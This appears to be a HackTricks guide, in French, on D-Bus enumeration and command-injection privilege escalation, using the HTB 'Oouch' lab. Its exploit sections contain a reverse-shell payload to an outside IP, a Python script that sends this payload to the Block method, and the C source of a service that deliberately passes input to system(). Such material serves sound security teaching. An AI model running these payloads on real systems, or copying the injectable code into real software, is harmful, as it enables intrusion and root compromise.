# D-Bus Enumeration & Command Injection Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## **GUI enumeration**

D-Bus est utilisé comme médiateur des communications inter-processus (IPC) dans les environnements de bureau Ubuntu. Sur Ubuntu, on observe le fonctionnement simultané de plusieurs message buses : le system bus, principalement utilisé par des **privileged services to expose services relevant across the system**, et un session bus pour chaque utilisateur connecté, exposant des services pertinents uniquement pour cet utilisateur spécifique. Ici, l’accent est mis principalement sur le system bus en raison de son association avec des services s’exécutant avec des privilèges plus élevés (par exemple, root) puisque notre objectif est d’élever les privilèges. Il est à noter que l’architecture de D-Bus emploie un 'router' par session bus, chargé de rediriger les messages client vers les services appropriés en fonction de l’adresse spécifiée par les clients pour le service avec lequel ils souhaitent communiquer.

Les services sur D-Bus sont définis par les **objects** et **interfaces** qu’ils exposent. Les objects peuvent être comparés à des instances de classe dans les langages OOP standard, chaque instance étant identifiée de manière unique par un **object path**. Ce chemin, similaire à un chemin de filesystem, identifie de manière unique chaque object exposé par le service. Une interface clé à des fins de recherche est l’interface **org.freedesktop.DBus.Introspectable**, qui propose une seule méthode, Introspect. Cette méthode renvoie une représentation XML des methods, signals et properties pris en charge par l’object, en se concentrant ici sur les methods tout en omettant les properties et signals.

Pour communiquer avec l’interface D-Bus, deux outils ont été utilisés : un outil CLI nommé **gdbus** pour invoquer facilement les methods exposées par D-Bus dans des scripts, et [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), un outil GUI basé sur Python conçu pour énumérer les services disponibles sur chaque bus et afficher les objects contenus dans chaque service.
```bash
sudo apt-get install d-feet
```
Si vous vérifiez le **session bus**, confirmez d’abord l’adresse actuelle :
```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

Dans la première image, les services enregistrés auprès du D-Bus system bus sont affichés, avec **org.debin.apt** spécifiquement mis en évidence après avoir sélectionné le bouton System Bus. D-Feet interroge ce service pour les objets, en affichant les interfaces, méthodes, propriétés et signaux des objets choisis, comme on le voit dans la deuxième image. La signature de chaque méthode est également détaillée.

Une fonctionnalité notable est l’affichage du **process ID (pid)** et de la **command line** du service, utile pour confirmer si le service s’exécute avec des privilèges élevés, ce qui est important pour la pertinence de la recherche.

**D-Feet permet aussi l’invocation de méthodes** : les utilisateurs peuvent saisir des expressions Python comme paramètres, que D-Feet convertit en types D-Bus avant de les transmettre au service.

Cependant, notez que **certaines méthodes nécessitent une authentification** avant de nous permettre de les invoquer. Nous ignorerons ces méthodes, puisque notre objectif est d’élever nos privilèges sans credentials dès le départ.

Notez aussi que certains services interrogent un autre service D-Bus nommé org.freedeskto.PolicyKit1 pour savoir si un utilisateur doit être autorisé ou non à effectuer certaines actions.

## **Cmd line Enumeration**

### List Service Objects

Il est possible de lister les interfaces D-Bus ouvertes avec :
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
Les services marqués comme **`(activatable)`** sont particulièrement intéressants car ils **ne sont pas encore en cours d’exécution**, mais une requête sur le bus peut les démarrer à la demande. Ne vous arrêtez pas à `busctl list` ; associez ces noms aux binaires réels qu’ils exécuteraient.
```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```
Cela vous indique rapidement quel chemin `Exec=` sera lancé pour un nom activable et sous quelle identité. Si le binaire ou sa chaîne d’exécution est faiblement protégée, un service inactif peut quand même devenir un chemin d’élévation de privilèges.

#### Connections

[From wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Lorsqu’un processus établit une connexion à un bus, le bus attribue à la connexion un nom spécial de bus appelé _unique connection name_. Les noms de bus de ce type sont immuables — il est garanti qu’ils ne changeront pas tant que la connexion existe — et, plus important encore, ils ne peuvent pas être réutilisés pendant la durée de vie du bus. Cela signifie qu’aucune autre connexion à ce bus n’aura jamais ce nom unique attribué, même si le même processus ferme la connexion au bus et en crée une nouvelle. Les noms de connexion uniques sont facilement reconnaissables car ils commencent par le caractère deux-points, autrement interdit.

### Service Object Info

Ensuite, vous pouvez obtenir quelques informations sur l’interface avec :
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
Corrélez aussi le nom du bus avec son unité `systemd` et le chemin de l’exécutable :
```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```
Cela répond à la question opérationnelle qui compte pendant le privesc : **si un appel de méthode réussit, quel binaire et quelle unité réels exécuteront l’action ?**

### Liste des interfaces d’un objet de service

Vous devez avoir suffisamment de permissions.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Introspect l'interface d'un objet Service

Notez que dans cet exemple, la dernière interface découverte a été sélectionnée à l'aide du paramètre `tree` (_voir section précédente_) :
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Notez la méthode `.Block` de l'interface `htb.oouch.Block` (celle qui nous intéresse). Le "s" des autres colonnes peut signifier qu'elle attend une string.

Avant d'essayer quoi que ce soit de dangereux, validez d'abord une méthode **read-oriented** ou autrement à faible risque. Cela distingue clairement trois cas : syntaxe incorrecte, accessible mais refusé, ou accessible et autorisé.
```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```
### Corréler les méthodes D-Bus avec les politiques et les actions

L’introspection vous dit **quoi** vous pouvez appeler, mais pas **pourquoi** un appel est autorisé ou refusé. Pour un vrai triage de privesc, vous devez généralement inspecter **trois couches ensemble** :

1. **Activation metadata** (`.service` files or `SystemdService=`) pour savoir quel binaire et quelle unit vont réellement s’exécuter.
2. **D-Bus XML policy** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`) pour savoir qui peut `own`, `send_destination`, ou `receive_sender`.
3. **Polkit action files** (`/usr/share/polkit-1/actions/*.policy`) pour connaître le modèle d’autorisation par défaut (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`).

Commandes utiles :
```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```
Ne supposez **pas** une correspondance 1:1 entre une méthode D-Bus et une action Polkit. La même méthode peut choisir une action différente selon l’objet modifié ou le contexte d’exécution. Le workflow pratique est donc :

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` et grep les fichiers `.policy` pertinents
3. des probes live à faible risque avec `busctl call`, `gdbus call`, ou `dbusmap --enable-probes --null-agent`

Les services proxy ou de compatibilité méritent une attention particulière. Un **proxy exécuté en root** qui relaie des requêtes vers un autre service D-Bus via sa propre connexion déjà établie peut, par erreur, faire considérer au backend que chaque requête provient de UID 0, sauf si l’identité de l’appelant d’origine est revalidée.

### Interface Monitor/Capture

Avec suffisamment de privilèges (seuls `send_destination` et `receive_sender` ne suffisent pas), vous pouvez **surveiller une communication D-Bus**.

Afin de **surveiller** une **communication**, vous devrez être **root.** Si vous trouvez encore des problèmes en étant root, consultez [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) et [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> Si vous savez comment configurer un fichier de configuration D-Bus pour **autoriser des utilisateurs non root à sniffer** la communication, veuillez **me contacter** !

Différentes façons de surveiller :
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
Dans l’exemple suivant, l’interface `htb.oouch.Block` est surveillée et **le message "**_**lalalalal**_**" est envoyé via une mauvaise communication**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Vous pouvez utiliser `capture` à la place de `monitor` pour enregistrer les résultats dans un fichier **pcapng** que Wireshark peut ouvrir :
```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```
#### Filtrer tout le bruit <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

S'il y a simplement trop d'informations sur le bus, passez une règle de correspondance comme ceci :
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Plusieurs règles peuvent être spécifiées. Si un message correspond à _n’importe laquelle_ des règles, le message sera affiché. Comme ceci :
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
See the [D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html) for more information on match rule syntax.

### More

`busctl` has even more options, [**find all of them here**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Vulnerable Scenario**

En tant qu’utilisateur **qtc dans l’hôte "oouch" de HTB**, vous pouvez trouver un **fichier de configuration D-Bus inattendu** situé dans _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Note de la configuration précédente que **vous devrez être l’utilisateur `root` ou `www-data` pour envoyer et recevoir des informations** via cette communication D-BUS.

En tant qu’utilisateur **qtc** dans le conteneur docker **aeb4525789d8**, vous pouvez trouver du code lié à dbus dans le fichier _/code/oouch/routes.py._ Voici le code intéressant :
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Comme vous pouvez le voir, il **se connecte à une interface D-Bus** et envoie à la fonction **"Block"** la "client_ip".

De l'autre côté de la connexion D-Bus, il y a un binaire compilé en C qui s'exécute. Ce code **écoute** sur la connexion D-Bus **l’adresse IP et appelle iptables via la fonction `system`** pour bloquer l’adresse IP donnée.\
**L’appel à `system` est vulnérable volontairement à une injection de commandes**, donc un payload comme le suivant créera un reverse shell : `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Exploit it

À la fin de cette page, vous pouvez trouver le **code C complet de l’application D-Bus**. À l’intérieur, vous pouvez voir entre les lignes 91-97 **comment le `D-Bus object path`** **et le `interface name`** sont **enregistrés**. Cette information sera nécessaire pour envoyer des informations à la connexion D-Bus :
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Aussi, à la ligne 57, vous pouvez voir que **la seule méthode enregistrée** pour cette communication D-Bus s'appelle `Block`(_**C’est pourquoi, dans la section suivante, les payloads vont être envoyés à l’objet de service `htb.oouch.Block`, à l’interface `/htb/oouch/Block` et au nom de méthode `Block`**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Le code python suivant enverra le payload à la connexion D-Bus vers la méthode `Block` via `block_iface.Block(runme)` (_notez qu'il a été extrait du bloc de code précédent_) :
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl et dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send` est un outil utilisé pour envoyer un message à “Message Bus”
- Message Bus – Un logiciel utilisé par les systèmes pour faciliter les communications entre applications. Il est lié à Message Queue (les messages sont ordonnés en séquence) mais dans Message Bus les messages sont envoyés dans un modèle d’abonnement et sont aussi très rapides.
- La balise “-system” est utilisée pour indiquer qu’il s’agit d’un message système, et non d’un message de session (par défaut).
- La balise “–print-reply” est utilisée pour afficher notre message correctement et recevoir toutes les réponses dans un format lisible par l’humain.
- “–dest=Dbus-Interface-Block” L’adresse de l’interface Dbus.
- “–string:” – Type de message que nous voulons envoyer à l’interface. Il existe plusieurs formats d’envoi de messages comme double, bytes, booleans, int, objpath. Parmi ceux-ci, le “object path” est utile lorsque nous voulons envoyer le chemin d’un fichier à l’interface Dbus. Nous pouvons utiliser un fichier spécial (FIFO) dans ce cas pour transmettre une commande à l’interface au nom d’un fichier. “string:;” – Cela sert à appeler à nouveau le object path où nous plaçons le fichier/commande FIFO reverse shell.

_Note that in `htb.oouch.Block.Block`, the first part (`htb.oouch.Block`) references the service object and the last part (`.Block`) references the method name._

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Automated Enumeration Helpers (2023-2025)

L’énumération manuelle d’une grande surface d’attaque D-Bus avec `busctl`/`gdbus` devient vite pénible. Deux petits utilitaires FOSS publiés ces dernières années peuvent accélérer les choses lors d’engagements red-team ou CTF :

### dbusmap ("Nmap for D-Bus")
* Author: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)
* Written in C; single static binary (<50 kB) that walks every object path, pulls the `Introspect` XML and maps it to the owning PID/UID.
* Useful flags:
```bash
# List every service on the *system* bus and dump all callable methods
sudo dbus-map --dump-methods

# Actively probe methods/properties you can reach without Polkit prompts
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```
* The tool marks unprotected well-known names with `!`, révélant instantanément les services que vous pouvez *own* (take over) ou les appels de méthodes accessibles depuis un shell non privilégié.

### uptux.py
* Author: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)
* Script Python-only qui recherche des chemins *writable* dans les unités systemd **et** des fichiers de politique D-Bus trop permissifs (par ex. `send_destination="*"`).
* Quick usage:
```bash
python3 uptux.py -n          # run all checks but don’t write a log file
python3 uptux.py -d          # enable verbose debug output
```
* Le module D-Bus recherche les répertoires ci-dessous et met en évidence tout service qui peut être spoofed ou hijacked par un utilisateur normal :
* `/etc/dbus-1/system.d/` and `/usr/share/dbus-1/system.d/`
* `/etc/dbus-1/system-local.d/` (vendor overrides)

---

## Notable D-Bus Privilege-Escalation Bugs (2024-2025)

Garder un œil sur les CVE publiées récemment aide à repérer des schémas insecure similaires dans du code personnalisé. Deux bons exemples récents sont :

| Year | CVE | Component | Root Cause | Offensive lesson |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | Le service exécuté en root exposait une interface D-Bus que les utilisateurs non privilégiés pouvaient reconfigurer, y compris le chargement d’un comportement de macro contrôlé par l’attaquant. | Si un daemon expose la gestion **device/profile/config** sur le system bus, traitez la configuration modifiable et les fonctions de macro comme des primitives d’exécution de code, et non comme de simples "settings". |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | Un proxy de compatibilité exécuté en root relayait les requêtes vers les services backend sans conserver le contexte de sécurité de l’appelant original, donc les backend faisaient confiance au proxy comme UID 0. | Traitez les services D-Bus **proxy / bridge / compatibility** comme une catégorie de bug distincte : s’ils relaient des appels privilégiés, vérifiez comment l’UID de l’appelant / le contexte Polkit atteignent le backend. |

Patterns to notice:
1. Service runs **as root on the system bus**.
2. Either there is **no authorization check**, or the check is performed against the **wrong subject**.
3. The reachable method eventually changes system state: package install, user/group changes, bootloader config, device profile updates, file writes, or direct command execution.

Use `dbusmap --enable-probes` or manual `busctl call` to confirm whether a method is reachable, then inspect the service's policy XML and Polkit actions to understand **which subject** is actually being authorized.

---

## Hardening & Detection Quick-Wins

* Search for world-writable or *send/receive*-open policies:
```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```
* Require Polkit for dangerous methods – even *root* proxies should pass the *caller* PID to `polkit_authority_check_authorization_sync()` instead of their own.
* Drop privileges in long-running helpers (use `sd_pid_get_owner_uid()` to switch namespaces after connecting to the bus).
* If you cannot remove a service, at least *scope* it to a dedicated Unix group and restrict access in its XML policy.
* Blue-team: capture the system bus with `busctl capture > /var/log/dbus_$(date +%F).pcapng` and import it into Wireshark for anomaly detection.

---

## References

- [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [https://github.com/PixlOne/logiops/issues/473](https://github.com/PixlOne/logiops/issues/473)
- [https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
{{#include ../../banners/hacktricks-training.md}}
